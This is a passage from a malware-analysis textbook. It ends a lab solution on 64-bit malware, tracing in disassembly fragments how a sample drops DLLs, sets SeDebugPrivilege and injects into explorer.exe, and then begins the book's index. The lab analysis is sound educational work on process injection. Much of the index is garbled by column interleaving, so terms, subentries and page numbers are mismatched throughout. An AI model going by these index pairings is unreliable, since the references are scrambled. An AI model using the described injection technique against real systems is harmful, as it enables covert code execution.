<p class="calibre1">004013D9         push    offset aLab2102_dll     ; "Lab21-02.dll" </p>
<p class="calibre1">004013DE         push    offset aX86             ; "X86" </p>
<p class="calibre1">004013E3         call    extractResource       ; formerly sub_401000</p>
<p class="calibre1"> <i class="calibre4">Listing 21-10L: extractResource being called with X86 parameters</i> Examining the extractResource function, we see that it, in fact, extracts the X86 resource to disk and appends the second argument to the result of GetSystemDirectoryA, thereby extracting the X86 resource to  <i class="calibre4">C:\Windows\</i> <i class="calibre4">System32\Lab21-02.dll</i>. </p>
<p class="calibre1">Next, the malware sets SeDebugPrivilege with the call to sub_401130, which uses the API functions OpenProcessToken, LookupPrivilegeValueA, and AdjustTokenPrivileges, as explained in “Using SeDebugPrivilege” on page 246. </p>
<p class="calibre1">Then the malware calls EnumProcesses and loops through the process list looking for a module base name of explorer.exe using the strnicmp function. </p>
<p class="calibre1">Finally, the malware performs DLL injection of  <i class="calibre4">Lab21-02.dll</i> into <i class="calibre4">explorer.exe</i> using VirtualAllocEx and CreateRemoteThread. This method of DLL </p>
<p class="calibre1">injection is identical to Lab 12-1. Comparing the MD5 hash of  <i class="calibre4">Lab21-02.dll</i> with  <i class="calibre4">Lab12-01.dll</i>, we see that they are identical. Therefore, we conclude that this malware operates the same as Lab 12-1 when it is run on a 32-bit machine. We must investigate the x64 code path to figure out if this malware operates differently on a 64-bit machine. </p>
<p class="calibre1"><b class="calibre3">730</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p764"/><b class="calibre3">X64 Code Path</b></p>
<p class="calibre1">The x64 code path begins by calling the extractResource function twice to extract the X64 and X64DLL resources to disk, as shown in Listing 21-11L. </p>
<p class="calibre1">0040132F         push    offset aLab2102x_dll    ; "Lab21-02x.dll" </p>
<p class="calibre1">00401334         push    offset aX64dll          ; "X64DLL" </p>
<p class="calibre1">00401339         mov     eax, edi</p>
<p class="calibre1">0040133B         call    extractResource</p>
<p class="calibre1">... </p>
<p class="calibre1">0040134D         push    offset aLab2102x_exe    ; "Lab21-02x.exe" </p>
<p class="calibre1">00401352         push    offset aX64             ; "X64" </p>
<p class="calibre1">00401357         mov     eax, edi</p>
<p class="calibre1">00401359         call    extractResource</p>
<p class="calibre1"> <i class="calibre4">Listing 21-11L: Resource extraction of two binaries when run on x64 </i></p>
<p class="calibre1">The two binaries are extracted to the files  <i class="calibre4">Lab21-02x.dll</i> and  <i class="calibre4">Lab21-02x.exe</i>, and placed into the directory returned by GetSystemDirectoryA. However, if we run this malware dynamically on a 64-bit system, we won’t see those binaries in  <i class="calibre4">C:\Windows\System32</i>. Since  <i class="calibre4">Lab21-02.exe</i> is a 32-bit binary running on a 64-bit machine, it is running under WOW64. The system directory is mapped to  <i class="calibre4">C:\Windows\SysWOW64</i>, and that is where we will find these files on a 64-bit machine. </p>
<p class="calibre1">Next, the malware launches  <i class="calibre4">Lab21-02x.exe</i> on the local machine using ShellExecuteA. Looking at the PE header of  <i class="calibre4">Lab21-02x.exe</i>, we see that the IMAGE_FILE_64BIT_MACHINE flag is set for the Characteristics field. This tells us that this binary is compiled for and will run as a 64-bit process. </p>
<p class="calibre1">In order to disassemble  <i class="calibre4">Lab21-02x.exe</i> with IDA Pro, we need to use the x64 advanced version of IDA Pro. When we disassemble this file, we see that from a high level, its structure looks like  <i class="calibre4">Lab21-02.exe</i>. For example, <i class="calibre4">Lab21-02x.exe</i> also starts by dynamically resolving the API functions for iterating through the process list.  <i class="calibre4">Lab21-02x.exe</i> deviates from  <i class="calibre4">Lab21-02.exe</i> when it builds a string using lstrcpyA and lstrcatA, as seen at  and  in Listing 21-12L. </p>
<p class="calibre1">00000001400011BF         lea     rdx, String2 ; "C:\\Windows\\SysWOW64\\" </p>
<p class="calibre1">00000001400011C6         lea     rcx, [rsp+1168h+<b class="calibre3">Buffer</b>] ; lpString1</p>
<p class="calibre1">... </p>
<p class="calibre1">00000001400011D2         call    cs:lstrcpyA </p>
<p class="calibre1">00000001400011D8         lea     rdx, aLab2102x_dll      ; "Lab21-02x.dll" </p>
<p class="calibre1">00000001400011DF         lea     rcx, [rsp+1168h+<b class="calibre3">Buffer</b>] ; lpString1</p>
<p class="calibre1">00000001400011E4         call    cs:lstrcatA </p>
<p class="calibre1">... </p>
<p class="calibre1">00000001400012CF         lea     r8, [rsp+1168h+<b class="calibre3">Buffer</b>]; lpBuffer 00000001400012D4         mov     r9d, 104h               ; nSize 00000001400012DA         mov     rdx, rax        ; lpBaseAddress 00000001400012DD         mov     rcx, rsi        ; hProcess 00000001400012E0         mov     [rsp+1168h+var_1148], 0</p>
<p class="calibre1">00000001400012E9         call    cs:WriteProcessMemory</p>
<p class="calibre1"><b class="calibre3">2 1</b></p>
<p class="calibre1"> <i class="calibre4">Listing 21-12L: Building the DLL path string and writing it to a remote process</i> Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">731</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p765"/>The string built matches the location of where the DLL was dropped to disk:  <i class="calibre4">C:\Windows\SysWOW64\ Lab21-02x.dll</i>. The result of this string will be contained in the local variable Buffer (shown in bold in the listing). Buffer is eventually passed to WriteProcessMemory in register r8 (lpBuffer parameter) at , and luckily IDA Pro has recognized and added comments for the parameters, even though there are not any push instructions. </p>
<p class="calibre1">Seeing the DLL string written to memory like this followed by a call to CreateRemoteThread tells us that this binary also performs DLL injection. We find the string explorer.exe in the strings listing and track its cross-reference to 0x140001100, as shown in Listing 21-13L at . </p>
<p class="calibre1">00000001400010FA         call    cs:QueryFullProcessImageNameA 0000000140001100         lea     rdx, aExplorer_exe    ; "explorer.exe" </p>
<p class="calibre1">0000000140001107         lea     rcx, [rsp+138h+var_118]</p>
<p class="calibre1">000000014000110C         call    sub_140001368</p>
<p class="calibre1"> <i class="calibre4">Listing 21-13L: Code that uses QueryFullProcessImageNameA to look for the </i> explorer.exe <i class="calibre4"> </i></p>
<p class="calibre1"> <i class="calibre4">process</i></p>
<p class="calibre1">This code is called within the process iteration loop, and the result of QueryFullProcessImageNameA is passed with explorer.exe to sub_140001368. By inference, we can conclude that this is some sort of string-comparison function that the IDA Pro FLIRT library didn’t recognize. </p>
<p class="calibre1">This malware operates in the same way as the x86 version by injecting into  <i class="calibre4">explorer.exe</i>. However, this 64-bit version injects into the 64-bit version of Explorer. We open  <i class="calibre4">Lab21-02x.dll</i> in the advanced version of IDA Pro and see that it is identical to  <i class="calibre4">Lab21-02.dll</i>, but compiled for x64. </p>
<p class="calibre1"><b class="calibre3">732</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p766"/><b class="calibre3">I N D E X</b></p>
<p class="calibre1"><b class="calibre3">Symbols and Numbers</b></p>
<p class="calibre1">administrator privileges, for malware </p>
<p class="calibre1">launchers, 254</p>
<p class="calibre1">! (bang symbol), 305</p>
<p class="calibre1">Adobe Reader</p>
<p class="calibre1">-- operation, 112</p>
<p class="calibre1">CVE-2010-0188 critical </p>
<p class="calibre1">% operation, 112</p>
<p class="calibre1">vulnerability, 424</p>
<p class="calibre1">% symbol, 423</p>
<p class="calibre1">overflow in, 705</p>
<p class="calibre1">| (pipe symbol), in Snort, 304</p>
<p class="calibre1">ADS (Alternate Data Streams) </p>
<p class="calibre1">++ operation, 112</p>
<p class="calibre1">010 Editor, 468</p>
<p class="calibre1">feature, 139</p>
<p class="calibre1">32-bit applications, WOW64 and, 448</p>
<p class="calibre1">Advanced Encryption Standard </p>
<p class="calibre1">32-bit rotate-right-additive hash, 418</p>
<p class="calibre1">(AES), 618</p>
<p class="calibre1">64-bit malware, 441–449</p>
<p class="calibre1">decrypting, 625–626</p>
<p class="calibre1">clues to functionality, 448</p>
<p class="calibre1"> <i class="calibre4">advapi32.dll</i>, 17</p>
<p class="calibre1">labs, 450–451</p>
<p class="calibre1">imports from, 20, 480, 481</p>
<p class="calibre1">solutions, 723–732</p>
<p class="calibre1">obtaining handle to, 237</p>
<p class="calibre1">advertisements, pop-up, 560–561</p>
<p class="calibre1"><b class="calibre3">A</b></p>
<p class="calibre1">AES (Advanced Encryption </p>
<p class="calibre1">Standard), 618</p>
<p class="calibre1"> <i class="calibre4">A</i>, at end of Windows function </p>
<p class="calibre1">decrypting, 625–626</p>
<p class="calibre1">name, 17</p>
<p class="calibre1">Agobot, 376</p>
<p class="calibre1">absolute addresses, 443</p>
<p class="calibre1">air-gapped networks, 29</p>
<p class="calibre1">vs. relative addresses, in OllyDbg, </p>
<p class="calibre1">_alloca_probe function, 522</p>
<p class="calibre1">184–185</p>
<p class="calibre1">alphabetic encoding, shellcode </p>
<p class="calibre1">abstraction levels, in x86 disassembly, </p>
<p class="calibre1">decoder with, 697</p>
<p class="calibre1">66–67</p>
<p class="calibre1">Alternate Data Streams (ADS) </p>
<p class="calibre1">accept function, 143, 144, 454</p>
<p class="calibre1">feature, 139</p>
<p class="calibre1">access token, 246</p>
<p class="calibre1">ALU (arithmetic logic unit), 68</p>
<p class="calibre1">accuracy, vs. expediency, 304</p>
<p class="calibre1">AMD64 architecture, 441</p>
<p class="calibre1">active window, logging, 239</p>
<p class="calibre1">“Analysis of the Intel Pentium’s </p>
<p class="calibre1">ADD encoding algorithm, 276</p>
<p class="calibre1">Ability to Support a Secure </p>
<p class="calibre1">add instruction, 74, 349</p>
<p class="calibre1">Virtual Machine Monitor” </p>
<p class="calibre1">AddCodeXref function (IDC), 342</p>
<p class="calibre1">(Robin and Irvine), 373</p>
<p class="calibre1">address space, loading executable </p>
<p class="calibre1">AND logical operator, in x86 </p>
<p class="calibre1">into another process’s, 595</p>
<p class="calibre1">architecture, 75</p>
<p class="calibre1">address space layout randomization </p>
<p class="calibre1">anti-debugging, 351–366</p>
<p class="calibre1">(ASLR), 184</p>
<p class="calibre1">checks, 656</p>
<p class="calibre1">AddressOfNameOrdinals array, 416</p>
<p class="calibre1">defeating techniques, 660</p>
<p class="calibre1">AddressOfNames array, 416</p>
<p class="calibre1">labs, 367–368</p>
<p class="calibre1">AdjustTokenPrivileges function, 246, </p>
<p class="calibre1">solutions, 655–669</p>
<p class="calibre1">247, 454, 730</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p767"/>anti-debugging,  <i class="calibre4">continued</i></p>
<p class="calibre1">labs, 381–382</p>
<p class="calibre1">NTGlobalFlag flag, 659–660</p>
<p class="calibre1">solutions, 670–684</p>
<p class="calibre1">PhantOm protection from checks, </p>
<p class="calibre1">process replacement, 683–684</p>
<p class="calibre1">658, 659</p>
<p class="calibre1">tweaking settings, 379–380</p>
<p class="calibre1">ProcessHeap flag, 658–659</p>
<p class="calibre1">VMware artifacts, 370–373</p>
<p class="calibre1">timing checks, 665–669</p>
<p class="calibre1">vulnerable instructions, 373–379, </p>
<p class="calibre1">GetTickCount function, 668–669</p>
<p class="calibre1">678–679</p>
<p class="calibre1">with QueryPerformanceCounter, </p>
<p class="calibre1">No Pill technique, 375</p>
<p class="calibre1">667–668</p>
<p class="calibre1">querying I/O communication </p>
<p class="calibre1">rdtsc function, 669</p>
<p class="calibre1">port, 375–377</p>
<p class="calibre1">anti-disassembly, 327–349</p>
<p class="calibre1">Red Pill anti-VM technique, </p>
<p class="calibre1">basics, 328–329</p>
<p class="calibre1">374–375</p>
<p class="calibre1">defeating disassembly algorithms, </p>
<p class="calibre1">antivirus programs, and kernel </p>
<p class="calibre1">329–334</p>
<p class="calibre1">patching, 227</p>
<p class="calibre1">flow-oriented disassembly, </p>
<p class="calibre1">antivirus scanning, 10</p>
<p class="calibre1">331–334</p>
<p class="calibre1">antivirus signatures, scan against, 478</p>
<p class="calibre1">linear disassembly, 329–331</p>
<p class="calibre1">Anubis, 40</p>
<p class="calibre1">false conditional branch, 336, 645, </p>
<p class="calibre1">ApateDNS, 51–52, 57, 465, 483, 485</p>
<p class="calibre1">647, 653</p>
<p class="calibre1">malware DNS requests and, 489</p>
<p class="calibre1">labs, 350</p>
<p class="calibre1">APC (asynchronous procedure </p>
<p class="calibre1">solutions, 645–655</p>
<p class="calibre1">call), 263</p>
<p class="calibre1">malware awareness of </p>
<p class="calibre1">APC injection, 262–265</p>
<p class="calibre1">debugger, 351</p>
<p class="calibre1">AppInit_DLLs, 241–242, 572</p>
<p class="calibre1">manually repaired code, 648–649</p>
<p class="calibre1">for persistence, 575</p>
<p class="calibre1">obscuring flow control, 340–346</p>
<p class="calibre1">applications, access to device </p>
<p class="calibre1">adding missing code cross-</p>
<p class="calibre1">objects, 206</p>
<p class="calibre1">references in IDA Pro, 342</p>
<p class="calibre1">arguments in malware, OllyDbg to </p>
<p class="calibre1">function pointer problem, </p>
<p class="calibre1">debug, 532</p>
<p class="calibre1">340–341</p>
<p class="calibre1">arithmetic instruction, 74–76</p>
<p class="calibre1">misusing structured exception </p>
<p class="calibre1">arithmetic logic unit (ALU), 68</p>
<p class="calibre1">handlers, 344–346</p>
<p class="calibre1">arithmetic operations</p>
<p class="calibre1">return pointer abuse, 342–343</p>
<p class="calibre1">disassembly, 112–113</p>
<p class="calibre1">signs of, 645–646</p>
<p class="calibre1">in WinDbg, 211</p>
<p class="calibre1">techniques, 334–340</p>
<p class="calibre1">arrays, disassembling, 127–128</p>
<p class="calibre1">impossible disassembly, 337–340</p>
<p class="calibre1">arrows window, in IDA Pro, 90</p>
<p class="calibre1">jump instruction with constant </p>
<p class="calibre1"> <i class="calibre4">The Art of Assembly Language</i> </p>
<p class="calibre1">condition, 336</p>
<p class="calibre1">(Hyde), 68</p>
<p class="calibre1">jump instructions with same </p>
<p class="calibre1">ASCII strings, 11</p>
<p class="calibre1">target, 334–335</p>
<p class="calibre1">loading on stack, 724–725</p>
<p class="calibre1">NOP-ing out instructions with </p>
<p class="calibre1">ASLR (address space layout </p>
<p class="calibre1">IDA Pro, 340</p>
<p class="calibre1">randomization), 184</p>
<p class="calibre1">thwarting stack-frame analysis, </p>
<p class="calibre1">ASPack, 398</p>
<p class="calibre1">347–349</p>
<p class="calibre1">assembly code, for process </p>
<p class="calibre1">anti-virtual machine (anti-VM) tech-</p>
<p class="calibre1">replacement, 258</p>
<p class="calibre1">niques, 369–380, 500, 678</p>
<p class="calibre1">assembly language, 67.  <i class="calibre4">See also</i> C code </p>
<p class="calibre1">finding using strings, 679–683</p>
<p class="calibre1">constructs in assembly</p>
<p class="calibre1">highlighting anti-VM in IDA Pro, </p>
<p class="calibre1">if statement, 113–114</p>
<p class="calibre1">377–378</p>
<p class="calibre1">for loop, 117</p>
<p class="calibre1">impact on malware analysis, </p>
<p class="calibre1">switch statement, 124</p>
<p class="calibre1">673–677</p>
<p class="calibre1">while loop, 118</p>
<p class="calibre1"><b class="calibre3">734</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p768"/>assembly-level debuggers, vs. </p>
<p class="calibre1">packet structure, 643</p>
<p class="calibre1">source-level, 168</p>
<p class="calibre1">request from initial malware run, </p>
<p class="calibre1">asynchronous procedure call </p>
<p class="calibre1">627–628</p>
<p class="calibre1">(APC), 263</p>
<p class="calibre1">sending by malware, 633–634, </p>
<p class="calibre1">AT_INFO structure, 547–548</p>
<p class="calibre1">639–640</p>
<p class="calibre1">AttachThreadInput function, 454</p>
<p class="calibre1">string decoding, 636</p>
<p class="calibre1">attackers</p>
<p class="calibre1">beep driver, 214</p>
<p class="calibre1">identifying investigative activity, 299</p>
<p class="calibre1">behavior of malware.  <i class="calibre4">See</i> malware </p>
<p class="calibre1">safely investigating online, 300–302</p>
<p class="calibre1">behavior</p>
<p class="calibre1">Autoruns tool, 140, 241, 465–466</p>
<p class="calibre1">BeingDebugged flag, 354, 657–658</p>
<p class="calibre1">checking, 353–354</p>
<p class="calibre1"><b class="calibre3">B</b></p>
<p class="calibre1">Berkeley compatible sockets, 143–144</p>
<p class="calibre1">BFK DNS logger, 302</p>
<p class="calibre1">backdoor, 3, 121, 232–234, 479, </p>
<p class="calibre1">BHOs (Browser Helper Objects), 157</p>
<p class="calibre1">519, 538</p>
<p class="calibre1">big-endian, 70</p>
<p class="calibre1">analysis, 537–538</p>
<p class="calibre1">binary data</p>
<p class="calibre1">CreateProcess and Sleep functions </p>
<p class="calibre1">Base64-encoding conversion, 277</p>
<p class="calibre1">for, 479</p>
<p class="calibre1">static analysis, 503–507</p>
<p class="calibre1">evading detection, 308–311</p>
<p class="calibre1">Binary File option, in IDA Pro, 88</p>
<p class="calibre1">HTTP reverse, 539</p>
<p class="calibre1">binary translation by VMware, in </p>
<p class="calibre1">implementing, 524</p>
<p class="calibre1">kernel mode, 373</p>
<p class="calibre1">indications of, 493</p>
<p class="calibre1">bind function, 143, 144, 454</p>
<p class="calibre1">reading configuration file, 723</p>
<p class="calibre1">BinDiff, 466</p>
<p class="calibre1">sandbox and, 41</p>
<p class="calibre1">BinNavi, 466</p>
<p class="calibre1">backup images, of operating </p>
<p class="calibre1">BitBlaze, 40</p>
<p class="calibre1">systems, 30</p>
<p class="calibre1">BitBlt function, 454</p>
<p class="calibre1">“Bad or Unknown 32-bit Executable </p>
<p class="calibre1">blacklists, of IP addresses, 301</p>
<p class="calibre1">File” error, 363</p>
<p class="calibre1">Blink pointers, 414</p>
<p class="calibre1">bang symbol (!), 305</p>
<p class="calibre1">block cryptography algorithms, 626</p>
<p class="calibre1">base addresses</p>
<p class="calibre1">blue screen, in Windows, 158</p>
<p class="calibre1">finding with PEview, 545</p>
<p class="calibre1">Bochs (debugger), 467</p>
<p class="calibre1">of  <i class="calibre4">kernel32.dll</i>, finding with </p>
<p class="calibre1">Bookmarks plug-in, in OllyDbg, </p>
<p class="calibre1">assembly code, 415</p>
<p class="calibre1">199–200</p>
<p class="calibre1">for PE files in Windows, 184</p>
<p class="calibre1"> <i class="calibre4">boot.ini</i> file, 207–208, 226</p>
<p class="calibre1">Base64 cipher, 277–280, 622</p>
<p class="calibre1">botnet controller, 234</p>
<p class="calibre1">custom substitution cipher, 280</p>
<p class="calibre1">botnets, 3, 234, 376</p>
<p class="calibre1">identifying and decoding, 278–280</p>
<p class="calibre1">bp command, in WinDbg, 211</p>
<p class="calibre1">Base64 encoding</p>
<p class="calibre1">branching, in x86 architecture, 80–81</p>
<p class="calibre1">decoding, 624–625</p>
<p class="calibre1">breakpoints</p>
<p class="calibre1">identifying in URL, 611</p>
<p class="calibre1">in debuggers, 171–175</p>
<p class="calibre1">padding, 610, 630</p>
<p class="calibre1">conditional, 175</p>
<p class="calibre1">Python program to decode </p>
<p class="calibre1">hardware execution, 174–175</p>
<p class="calibre1">string, 289</p>
<p class="calibre1">software execution, 173–174</p>
<p class="calibre1">static pattern within, 631</p>
<p class="calibre1">deferred, 212–213, 554</p>
<p class="calibre1">base64_encode function, 610</p>
<p class="calibre1">hardware vs. software, 687</p>
<p class="calibre1">basename, 535</p>
<p class="calibre1">for kernel activity, 548</p>
<p class="calibre1">BCDEdit, 227</p>
<p class="calibre1">in OllyDbg, 188–191, 391</p>
<p class="calibre1">beaconing, 309, 611</p>
<p class="calibre1">command-line to set, 199</p>
<p class="calibre1">client-initiated, 311</p>
<p class="calibre1">scanning code for, 357</p>
<p class="calibre1">determining generation, 628–629</p>
<p class="calibre1">and self-decoding, 289</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">735</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p769"/>breakpoints,  <i class="calibre4">continued</i></p>
<p class="calibre1">object-oriented programming, </p>
<p class="calibre1">setting, 357</p>
<p class="calibre1">427–432</p>
<p class="calibre1">setting on stack, 690</p>
<p class="calibre1">inheritance and function </p>
<p class="calibre1">in WinDbg, 211–212</p>
<p class="calibre1">overriding, 432</p>
<p class="calibre1">bridged network adapter, 34</p>
<p class="calibre1">overloading and mangling, </p>
<p class="calibre1">Browser Helper Objects (BHOs), 157</p>
<p class="calibre1">430–431</p>
<p class="calibre1">brute-force XOR encoding, 271–273</p>
<p class="calibre1">this pointer, 428–430</p>
<p class="calibre1">bu command, in WinDbg, 212</p>
<p class="calibre1">objects creation and </p>
<p class="calibre1">bu $iment command, in WinDbg, </p>
<p class="calibre1">destruction, 437</p>
<p class="calibre1">213, 554</p>
<p class="calibre1">virtual vs. nonvirtual functions, </p>
<p class="calibre1">buffer, malware placement of </p>
<p class="calibre1">432–436</p>
<p class="calibre1">value in, 538</p>
<p class="calibre1">Caesar cipher, 270</p>
<p class="calibre1">buffer-overflow attack, 421</p>
<p class="calibre1">call instruction, 119, 333, 386, 409</p>
<p class="calibre1">Burp Suite, 467</p>
<p class="calibre1">and finding OEP, 391–392</p>
<p class="calibre1">Buster Sandbox Analyzer, 473</p>
<p class="calibre1">position dependence, 408</p>
<p class="calibre1">byte array initialization, 680–681</p>
<p class="calibre1">for quick analysis, 521–522</p>
<p class="calibre1">bytecode, 67</p>
<p class="calibre1">with target based on DWORD </p>
<p class="calibre1">pointer, 396</p>
<p class="calibre1"><b class="calibre3">C</b></p>
<p class="calibre1">call  <i class="calibre4">memory_location</i>, 77</p>
<p class="calibre1">call stack trace, in OllyDbg, 193</p>
<p class="calibre1">C code constructs in assembly, </p>
<p class="calibre1">callback type, 136</p>
<p class="calibre1">109–132</p>
<p class="calibre1">calling conventions, x64 architecture </p>
<p class="calibre1">arithmetic operations disassembly, </p>
<p class="calibre1">differences, 443–447</p>
<p class="calibre1">112–113</p>
<p class="calibre1">CallNextHookEx function, 260, 261, 454</p>
<p class="calibre1">array disassembly, 127–128</p>
<p class="calibre1">function call conventions, 119–121</p>
<p class="calibre1">Canvas penetration-testing tool, 380</p>
<p class="calibre1">global vs. local variables, 110–112</p>
<p class="calibre1">Capture BAT, 467</p>
<p class="calibre1">capturing events</p>
<p class="calibre1">if statements, 113–116</p>
<p class="calibre1">labs, 133–134</p>
<p class="calibre1">network traffic, 580</p>
<p class="calibre1">solutions, 501–513</p>
<p class="calibre1">stopping procmon from, 44</p>
<p class="calibre1">linked list traversal, 130–132</p>
<p class="calibre1">capturing screen, function for, 615</p>
<p class="calibre1">loops, 116–118</p>
<p class="calibre1">CBC (Cipher Block Chaining), 626</p>
<p class="calibre1">for loops, 116–118</p>
<p class="calibre1">cdecl calling convention, 119–120</p>
<p class="calibre1">while loops, 118</p>
<p class="calibre1">cell phone malware, 88</p>
<p class="calibre1">structures, identifying, 128–130</p>
<p class="calibre1">central processing unit (CPU) </p>
<p class="calibre1">switch statements, 121–126</p>
<p class="calibre1">threads and, 149</p>
<p class="calibre1">if style for, 122–123, 124</p>
<p class="calibre1">in x86 architecture, 68</p>
<p class="calibre1">jump table, 123–126</p>
<p class="calibre1">CertOpenSystemStore function, 454</p>
<p class="calibre1">C programming language, 110</p>
<p class="calibre1">CF (carry) flag, 72</p>
<p class="calibre1">function pointers in, 340</p>
<p class="calibre1">CFB (Cipher Feedback), 626</p>
<p class="calibre1">main method and offsets, in x86 </p>
<p class="calibre1">CFF Explorer, 467</p>
<p class="calibre1">architecture, 83–84</p>
<p class="calibre1">cfile.read command, 293</p>
<p class="calibre1">pseudocode for process </p>
<p class="calibre1">chained encoding algorithm, 277</p>
<p class="calibre1">replacement, 258</p>
<p class="calibre1">CheckRemoteDebuggerPresent function, </p>
<p class="calibre1">standard library, IDA Pro catalog </p>
<p class="calibre1">352, 454</p>
<p class="calibre1">of named constants, 102</p>
<p class="calibre1">child classes in C++, 432</p>
<p class="calibre1"> <i class="calibre4">The C Programming Language</i> </p>
<p class="calibre1">functions from parent class, 436</p>
<p class="calibre1">(Kernighan and Ritchie), 110</p>
<p class="calibre1">chunk size, dependency with entropy </p>
<p class="calibre1">C++ analysis, 427–438</p>
<p class="calibre1">score, 284</p>
<p class="calibre1">labs, 439–440</p>
<p class="calibre1">Cipher Block Chaining (CBC), 626</p>
<p class="calibre1">solutions, 712–723</p>
<p class="calibre1">Cipher Feedback (CFB), 626</p>
<p class="calibre1"><b class="calibre3">736</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p770"/>ciphers, 270–280</p>
<p class="calibre1">check for arguments, 525–529</p>
<p class="calibre1">Base 64, 277–280</p>
<p class="calibre1">encoded, 636</p>
<p class="calibre1">Caesar cipher, 270</p>
<p class="calibre1">option analysis, 535–537</p>
<p class="calibre1">other encoding schemes, 276–277</p>
<p class="calibre1">running malware from, 493</p>
<p class="calibre1">XOR cipher, 271–276</p>
<p class="calibre1">Command Line plug-in, for OllyDbg, </p>
<p class="calibre1"> <i class="calibre4">cisvc.exe</i></p>
<p class="calibre1">198–199, 657–658</p>
<p class="calibre1">PEview of original and trojanized </p>
<p class="calibre1">launching, 660</p>
<p class="calibre1">versions, 584–585</p>
<p class="calibre1">command processing, and malware </p>
<p class="calibre1">writing shellcode into, 583–584</p>
<p class="calibre1">signature, 644</p>
<p class="calibre1">class identifiers (CLSIDs), 155</p>
<p class="calibre1">command shell, thread input to, 636</p>
<p class="calibre1">and COM functionality, 518</p>
<p class="calibre1">comments</p>
<p class="calibre1">classes, in object-oriented code, 428</p>
<p class="calibre1">in HTML, 506</p>
<p class="calibre1">classtype keyword, in Snort, 304</p>
<p class="calibre1">command character parsed </p>
<p class="calibre1">client side of network, 144–145</p>
<p class="calibre1">from, 509</p>
<p class="calibre1">client-initiated beaconing, 311</p>
<p class="calibre1">to send commands to </p>
<p class="calibre1">client/server framework, Component </p>
<p class="calibre1">malware, 507</p>
<p class="calibre1">Object Model as, 154</p>
<p class="calibre1">in IDA Pro, 100</p>
<p class="calibre1">CloseHandle function, 526</p>
<p class="calibre1">Common Object File Format (COFF), </p>
<p class="calibre1">CloseServiceHandle function, 554</p>
<p class="calibre1">IDA Pro support for, 87</p>
<p class="calibre1">cloud services, 300</p>
<p class="calibre1">Comodo Instant Malware Analysis, 40</p>
<p class="calibre1">Cloudburst, 380</p>
<p class="calibre1">comparing strings, in Process </p>
<p class="calibre1">CLSIDs (class identifiers), 155</p>
<p class="calibre1">Explorer, 49</p>
<p class="calibre1">and COM functionality, 518</p>
<p class="calibre1">compilation, 67</p>
<p class="calibre1"> <i class="calibre4">cmd.exe</i>, 544</p>
<p class="calibre1">Component Object Model (COM), </p>
<p class="calibre1">cmp instruction, 80, 348, 502</p>
<p class="calibre1">154–157, 313, 626</p>
<p class="calibre1">CoCreateInstance function, 155–156, </p>
<p class="calibre1">related functions, 518</p>
<p class="calibre1">313, 454, 518</p>
<p class="calibre1">server malware, 157</p>
<p class="calibre1">code</p>
<p class="calibre1">compression algorithm, packers </p>
<p class="calibre1">in memory, 69</p>
<p class="calibre1">and, 384</p>
<p class="calibre1">performing checksums, 357</p>
<p class="calibre1">compsb instruction, 82</p>
<p class="calibre1">redefining in IDA Pro, 103</p>
<p class="calibre1">ComSpec environmental variable, 636</p>
<p class="calibre1">understanding surrounding, </p>
<p class="calibre1">conditional branches, 348</p>
<p class="calibre1">312–313</p>
<p class="calibre1">false, 645, 647</p>
<p class="calibre1">code construct, 109</p>
<p class="calibre1">flow-oriented disassembly and, 333</p>
<p class="calibre1">code cross-references, 95–96</p>
<p class="calibre1">conditional breakpoints, 175</p>
<p class="calibre1">code entry point, unpacking stub </p>
<p class="calibre1">in OllyDbg, 188, 189–190</p>
<p class="calibre1">and, 384</p>
<p class="calibre1">conditional jump, 80–81, 113, </p>
<p class="calibre1">code libraries, linking, 15</p>
<p class="calibre1">116, 354</p>
<p class="calibre1">COFF (Common Object File Format), </p>
<p class="calibre1">conditionals, in x86 architecture, 80</p>
<p class="calibre1">IDA Pro support for, 87</p>
<p class="calibre1">configuration information, Windows </p>
<p class="calibre1">CoInitialize function, 313</p>
<p class="calibre1">Registry for, 139</p>
<p class="calibre1">CoInitializeEx function, 154</p>
<p class="calibre1">connect function, 143, 144, 313, </p>
<p class="calibre1">colors in IDA Pro navigation band, 93</p>
<p class="calibre1">454, 727</p>
<p class="calibre1">COM (Component Object Model), </p>
<p class="calibre1">connect mode, in Netcat, 52</p>
<p class="calibre1">154–157, 313, 626</p>
<p class="calibre1">ConnectNamedPipe function, 455</p>
<p class="calibre1">related functions, 518</p>
<p class="calibre1">console programs, </p>
<p class="calibre1">server malware, 157</p>
<p class="calibre1">IMAGE_SUBSYSTEM_WINDOWS_CUI </p>
<p class="calibre1">command-line</p>
<p class="calibre1">value for, 23</p>
<p class="calibre1">analysis of binary, 94</p>
<p class="calibre1">constructor, 437</p>
<p class="calibre1">arguments in malware, 526</p>
<p class="calibre1">content keyword, in Snort, 304</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">737</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p771"/>content-based countermeasures, 298, </p>
<p class="calibre1">hash dumping, 236–238</p>
<p class="calibre1">302–307</p>
<p class="calibre1">keystroke logging, 238–241</p>
<p class="calibre1">control unit, 68</p>
<p class="calibre1">cross-references (xref), 124</p>
<p class="calibre1">ControlService function, 455, 549</p>
<p class="calibre1">checking for gethostbyname, 495</p>
<p class="calibre1">convention, 72</p>
<p class="calibre1">for global variables, 547</p>
<p class="calibre1">CopyFile function, 526</p>
<p class="calibre1">graphs of, 98, 99</p>
<p class="calibre1">countermeasures</p>
<p class="calibre1">for function, 498</p>
<p class="calibre1">content-based, 302–307</p>
<p class="calibre1">for installer export, 572–573</p>
<p class="calibre1">network-based, 297</p>
